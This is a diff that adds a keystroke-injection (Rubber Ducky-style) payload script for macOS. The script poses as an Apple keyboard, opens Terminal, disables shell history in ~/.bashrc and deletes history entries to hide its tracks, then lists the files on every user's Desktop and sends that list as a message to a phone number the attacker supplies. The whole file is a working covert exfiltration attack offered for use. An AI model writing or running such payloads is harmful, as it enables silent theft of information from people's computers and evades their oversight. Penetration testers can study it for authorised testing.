@@ -1,0 +1,37 @@
+REM This script gets a list of the files on the Desktop,
+REM then it sends the list to your iphone.
+REM Shoutout to matthewkayne and 0iphor13 for the Phone code part.
+
+REM Replace "Phone Number HERE" with your phone number to receive MacOs System information
+
+REM Title: Desktop file list to iPhone
+REM Author: NARSTY
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Recon
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 500 
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+ENTER 
+DELAY 500
+STRING  x=$(ls /Users/*/Desktop); osascript -e 'tell application "Messages" to send "'$x'" to buddy "Phone Number HERE"'
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 2000
+GUI h
